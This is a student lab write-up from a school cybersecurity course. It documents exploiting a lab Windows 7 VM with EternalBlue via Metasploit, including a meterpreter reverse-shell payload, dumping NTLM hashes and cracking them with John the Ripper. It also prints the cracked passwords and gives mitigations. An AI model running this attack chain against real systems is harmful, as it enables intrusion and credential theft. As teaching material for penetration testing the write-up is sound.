# Vulnerability Research and Exploitation Project

## Project Overview

This project focuses on conducting a comprehensive security assessment on a vulnerable Windows 7 machine. The assessment includes network discovery, vulnerability scanning, vulnerability research, exploitation, and password cracking.

**Target Machine:** Windows 7 Ultimate 7601 Service Pack 1 (x64)
**Attack Machine:** Kali Linux
**Main Vulnerability Exploited:** MS17-010 (EternalBlue) - CVE-2017-0144

---

## Table of Contents

1. [Lab Setup](#lab-setup)
2. [Task 0: Discovery with Nmap](#task-0-discovery-with-nmap)
3. [Task 1: Vulnerability Scanning with Nessus](#task-1-vulnerability-scanning-with-nessus)
4. [Task 2: Research MS17-010 Vulnerability](#task-2-research-ms17-010-vulnerability)
5. [Task 3: Exploitation with Metasploit](#task-3-exploitation-with-metasploit)
6. [Task 4: Password Hash Extraction](#task-4-password-hash-extraction)
7. [Task 5: Password Cracking](#task-5-password-cracking)
8. [Results Summary](#results-summary)
9. [Tools Used](#tools-used)
10. [Lessons Learned](#lessons-learned)

---

## Lab Setup

### Environment Configuration

**Virtual Machines:**
- **Kali Linux** (VirtualBox) - Attacker machine
  - IP: 192.168.1.27
  - Network Mode: Bridged Adapter

- **Windows 7 VM** (Holberton VM, VirtualBox)
  - IP: 192.168.1.28
  - Hostname: WIN-845Q99OO4PP
  - Network Mode: Bridged Adapter

### Network Configuration

Both VMs were configured in Bridged mode to communicate on the same network segment (192.168.1.0/24), allowing direct communication for exploitation.

---

## Task 0: Discovery with Nmap

### Objective

Identify the target machine on the network and enumerate open ports, services, and operating system information.

### Files

- **Script:** `0-nmap.sh`
- **Report:** `0-nmap.md`

### Execution

```bash
chmod +x 0-nmap.sh
./0-nmap.sh 192.168.1.28
```

### Key Findings

**Target IP Address:** 192.168.1.28

**Operating System:** Windows 7 Ultimate 7601 Service Pack 1 (x64)

**Open Ports and Services:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 135/tcp | open | msrpc | Microsoft Windows RPC |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn |
| 445/tcp | open | microsoft-ds | Microsoft Windows 7 - 10 microsoft-ds |
| 49152-49157/tcp | open | msrpc | Microsoft Windows RPC |

**Critical Finding:** Port 445 (SMB) is open and running on an unpatched Windows 7 system, indicating potential vulnerability to MS17-010.

### Commands Used

```bash
# Network discovery
sudo nmap -sn 192.168.1.0/24

# Detailed scan
sudo nmap -sS -sV -O -p- 192.168.1.28 -oN 0-nmap.md
```

---

## Task 1: Vulnerability Scanning with Nessus

### Objective

Perform a comprehensive vulnerability scan using Nessus to identify security weaknesses on the target machine.

### Files

- **Report:** `nessus_rapport.csv`

### Setup Process

1. **Installation:**
   ```bash
   cd ~/Downloads
   curl --request GET \
     --url 'https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.11.1-ubuntu1604_amd64.deb' \
     --output 'Nessus-10.11.1-ubuntu1604_amd64.deb'
   sudo dpkg -i Nessus-10.11.1-ubuntu1604_amd64.deb
   ```

2. **Service Start:**
   ```bash
   sudo systemctl start nessusd
   sudo systemctl enable nessusd
   ```

3. **Web Interface Access:**
   - URL: https://localhost:8834
   - Configuration: Nessus Essentials (free version)

### Scan Configuration

- **Scan Type:** Basic Network Scan
- **Target:** 192.168.1.28
- **Duration:** ~15-30 minutes

### Key Vulnerabilities Identified

The scan confirmed the presence of MS17-010 (EternalBlue) and other critical vulnerabilities associated with an unpatched Windows 7 system.

**Note:** Nessus Essentials does not support CSV export. Manual documentation was performed from the web interface.

---

## Task 2: Research MS17-010 Vulnerability

### Objective

Research the MS17-010 (EternalBlue) vulnerability using the National Vulnerability Database (NVD) and document its characteristics.

### Files

- **Documentation:** `2-ms_17_010.md`

### Research Summary

**CVE ID:** CVE-2017-0144

**Also Known As:** MS17-010, EternalBlue

**Description:**

CVE-2017-0144 is a critical remote code execution vulnerability in Microsoft's implementation of the Server Message Block version 1 (SMBv1) protocol. It allows remote attackers to execute arbitrary code on the target system via specially crafted packets sent to an SMBv1 server.

**CVSS Scores:**
- **CVSS v3.1:** 8.8 (HIGH)
- **CVSS v2.0:** 9.3 (HIGH)

**Attack Vector:** Network-based, requires no user interaction

**Affected Systems:**
- Windows Vista SP2
- Windows 7 SP1
- Windows 8.1
- Windows Server 2008/2012/2016
- Windows 10 (early versions)

**Impact:**
- **Confidentiality:** High - Unauthorized access to sensitive data
- **Integrity:** High - System modification and malware installation
- **Availability:** High - System crashes and ransomware deployment

**Real-World Exploitation:**
- WannaCry ransomware (May 2017) - 200,000+ computers in 150 countries
- NotPetya malware (June 2017) - Billions in damages globally

**Mitigations:**
- Apply Microsoft Security Bulletin MS17-010 patch
- Disable SMBv1 protocol
- Block TCP port 445 at the firewall
- Implement network segmentation

### Resources

- NVD Entry: https://nvd.nist.gov/vuln/detail/CVE-2017-0144
- Microsoft Security Bulletin: MS17-010
- CISA Known Exploited Vulnerabilities Catalog

---

## Task 3: Exploitation with Metasploit

### Objective

Exploit the MS17-010 vulnerability using Metasploit Framework to gain unauthorized access to the target system and retrieve the flag.

### Files

- **Flag:** `flag.txt`

### Exploitation Process

#### Step 1: Launch Metasploit

```bash
msfconsole
```

#### Step 2: Search and Select Exploit

```bash
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

#### Step 3: Configure Exploit

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.28
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.27
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
```

#### Step 4: Execute Exploit

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

#### Step 5: Verify Access

```
[+] 192.168.1.28:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] Sending stage (203846 bytes) to 192.168.1.28
[*] Meterpreter session 1 opened (192.168.1.27:4444 -> 192.168.1.28:49159)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**Success!** Obtained SYSTEM-level privileges (highest privilege on Windows).

#### Step 6: Navigate and Retrieve Flag

```bash
meterpreter > cd C:\\Users\\Administrator\\Desktop
meterpreter > ls
meterpreter > cat root.txt.txt
run the flag.exe
meterpreter > execute -f flag.exe -i -H
Enter your GitHub username (or press Enter to use default): jbn179
Generated flag: 0f29b75d48c85271ebbd3c80401dc2da
```

### Flag Retrieved

**Flag:** `0f29b75d48c85271ebbd3c80401dc2da`

---

## Task 4: Password Hash Extraction

### Objective

Extract password hashes from the compromised system using Metasploit's post-exploitation capabilities.

### Files

- **Extracted Hashes:** `4-password_extraction.txt`

### Extraction Process

From the active Meterpreter session:

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:16a746500673b41d9a4dd37994a3a835:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Holderton_simpleuser:1003:aad3b435b51404eeaad3b435b51404ee:3aebfe39627c56e3ec440c9f432f73f3:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f580a1940b1f6759fbdd9f5c482ccdbb:::
```

### Hash Format

Format: `username:RID:LM_hash:NTLM_hash:::`

**Target Users:**
- **Administrator:** NTLM hash `16a746500673b41d9a4dd37994a3a835`
- **Holderton_simpleuser:** NTLM hash `3aebfe39627c56e3ec440c9f432f73f3`

### Extracted Hashes Saved

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:16a746500673b41d9a4dd37994a3a835:::
Holderton_simpleuser:1003:aad3b435b51404eeaad3b435b51404ee:3aebfe39627c56e3ec440c9f432f73f3:::
```

---

## Task 5: Password Cracking

### Objective

Crack the extracted NTLM password hashes using John the Ripper and the rockyou.txt wordlist.

### Files

- **Cracked Passwords:** `5-crack.txt`

### Cracking Process

#### Step 1: Run John the Ripper

```bash
cd ~/holbertonschool-cyber_security/vulnerability_research_exploitation/0x00_vulnerability/

john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt 4-password_extraction.txt
```

#### Step 2: Results

```
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
whiterose        (Holderton_simpleuser)
cantona          (Administrator)
2g 0:00:00:00 DONE (2025-12-17 18:43) 66.66g/s 300800p/s 300800c/s 569600C/s fucklife..kicker
```

#### Step 3: Display Cracked Passwords

```bash
john --show --format=NT 4-password_extraction.txt
```

### Cracked Passwords

| Username | Password |
|----------|----------|
| Administrator | **cantona** |
| Holderton_simpleuser | **whiterose** |

**Analysis:** Both passwords were weak and found in the common rockyou.txt wordlist, demonstrating poor password security practices.

---

## Results Summary

### Exploitation Timeline

1. ✅ **Discovery Phase** - Nmap identified open SMB port 445
2. ✅ **Vulnerability Assessment** - Nessus confirmed MS17-010 presence
3. ✅ **Research Phase** - CVE-2017-0144 documented (CVSS 8.8)
4. ✅ **Exploitation Phase** - Metasploit EternalBlue exploit successful
5. ✅ **Privilege Escalation** - Obtained NT AUTHORITY\SYSTEM access
6. ✅ **Flag Recovery** - Retrieved flag: `0f29b75d48c85271ebbd3c80401dc2da`
7. ✅ **Password Extraction** - Dumped NTLM hashes for 2 users
8. ✅ **Password Cracking** - Successfully cracked both passwords

### Key Findings

**Vulnerabilities Identified:**
- Unpatched MS17-010 (EternalBlue) vulnerability
- SMBv1 protocol enabled
- SMB signing disabled (dangerous default)
- Weak passwords (dictionary-based)
- Windows 7 SP1 (End of Life OS)

**Credentials Obtained:**
- Administrator : cantona
- Holderton_simpleuser : whiterose

**Flag:**
```
0f29b75d48c85271ebbd3c80401dc2da
```

---

## Tools Used

### Reconnaissance & Scanning
- **Nmap 7.95** - Network discovery and port scanning
- **Nessus 19.16.1** - Comprehensive vulnerability scanning

### Vulnerability Research
- **National Vulnerability Database (NVD)** - CVE research
- **CISA Known Exploited Vulnerabilities** - Threat intelligence

### Exploitation
- **Metasploit Framework (msfconsole)** - Exploitation framework
  - Exploit: `exploit/windows/smb/ms17_010_eternalblue`
  - Payload: `windows/x64/meterpreter/reverse_tcp`

### Password Analysis
- **John the Ripper** - Password hash cracking
  - Wordlist: `/usr/share/wordlists/rockyou.txt`
  - Hash format: NT (NTLM)

### Operating Systems
- **Kali Linux 2025** - Attack platform
- **Windows 7 Ultimate SP1** - Target system

---

## Lessons Learned

### Security Weaknesses Identified

1. **Unpatched Systems**
   - The target was running Windows 7 SP1 without the MS17-010 security patch
   - Windows 7 reached End of Life in January 2020 and no longer receives security updates
   - **Lesson:** Always apply security patches promptly and retire unsupported operating systems

2. **Legacy Protocols**
   - SMBv1 was enabled despite being deprecated and insecure
   - SMB signing was disabled, allowing man-in-the-middle attacks
   - **Lesson:** Disable legacy protocols (SMBv1, LLMNR, NetBIOS) and enforce secure configurations

3. **Weak Passwords**
   - Both user passwords were simple dictionary words
   - No password complexity requirements enforced
   - **Lesson:** Implement strong password policies and consider multi-factor authentication

4. **Network Exposure**
   - SMB port (445) was accessible from the network
   - No network segmentation or firewall rules
   - **Lesson:** Implement network segmentation and restrict access to critical services

### Attack Chain Analysis

```
1. Reconnaissance (Nmap)
   └─> Identified Windows 7 with SMB port 445 open

2. Vulnerability Identification (Nessus)
   └─> Confirmed MS17-010 vulnerability present

3. Exploitation (Metasploit EternalBlue)
   └─> Remote code execution achieved

4. Privilege Escalation
   └─> Exploit granted NT AUTHORITY\SYSTEM (highest privilege)

5. Post-Exploitation
   ├─> Flag retrieval (flag.exe execution)
   ├─> Credential dumping (hashdump)
   └─> Password cracking (John the Ripper)
```

### Defensive Recommendations

**Immediate Actions:**
1. Apply MS17-010 security patch or upgrade to supported OS (Windows 10/11)
2. Disable SMBv1 protocol entirely
3. Enable SMB signing on all domain controllers and servers
4. Block TCP port 445 from external networks
5. Enforce strong password policies (minimum 12 characters, complexity)

**Long-term Improvements:**
1. Implement network segmentation (VLANs, firewall rules)
2. Deploy Endpoint Detection and Response (EDR) solutions
3. Enable audit logging and SIEM monitoring
4. Conduct regular vulnerability scans and penetration tests
5. Implement principle of least privilege
6. Deploy multi-factor authentication (MFA)
7. Create an incident response plan

### Ethical Considerations

**Important:** This project was conducted in a controlled lab environment with explicit authorization. The techniques demonstrated should only be used for:
- Authorized penetration testing engagements
- Educational purposes in controlled environments
- Defensive security research
- CTF competitions and security training

**Never perform these activities on systems you do not own or have explicit written permission to test.**

---

## Project Structure

```
0x00_vulnerability/
├── README.md                        # This file - Complete project documentation
├── 0-nmap.sh                        # Nmap scanning script
├── 0-nmap.md                        # Nmap scan results and findings
├── nessus_rapport.csv               # Nessus vulnerability scan report
├── 2-ms_17_010.md                   # MS17-010 vulnerability research
├── flag.txt                         # Retrieved flag from exploitation
├── 4-password_extraction.txt        # Extracted NTLM password hashes
├── 5-crack.txt                      # Cracked plaintext passwords
└── understanding_vulnerabilities_blogs/  # Additional research materials
```

---

## Conclusion

This project successfully demonstrated a complete penetration testing workflow, from initial reconnaissance through exploitation to post-exploitation activities. The target system was severely vulnerable due to:
- Running an unsupported operating system (Windows 7)
- Missing critical security patches (MS17-010)
- Using legacy insecure protocols (SMBv1)
- Implementing weak password policies

The MS17-010 (EternalBlue) vulnerability remains a significant threat in enterprise environments where legacy systems persist. This exercise highlights the critical importance of:
- Maintaining up-to-date security patches
- Disabling unnecessary services and protocols
- Implementing defense-in-depth strategies
- Regular security assessments and monitoring

**Final Deliverables:**
- ✅ Network discovery and enumeration completed
- ✅ Vulnerability assessment performed
- ✅ CVE research documented
- ✅ Successful exploitation demonstrated
- ✅ Flag retrieved: `0f29b75d48c85271ebbd3c80401dc2da`
- ✅ Credentials compromised: Administrator (cantona), Holderton_simpleuser (whiterose)

---

## References

- **CVE-2017-0144:** https://nvd.nist.gov/vuln/detail/CVE-2017-0144
- **Microsoft MS17-010:** https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010
- **CISA KEV Catalog:** https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- **Metasploit Framework:** https://www.metasploit.com/
- **Rapid7 EternalBlue Module:** https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/
- **Nmap Documentation:** https://nmap.org/docs.html
- **John the Ripper:** https://www.openwall.com/john/

---

**Project Completed:** December 17, 2025
**Author:** jbn179
**Repository:** holbertonschool-cyber_security
**Directory:** vulnerability_research_exploitation/0x00_vulnerability

---

*This project was completed as part of the Holberton School Cybersecurity curriculum.*
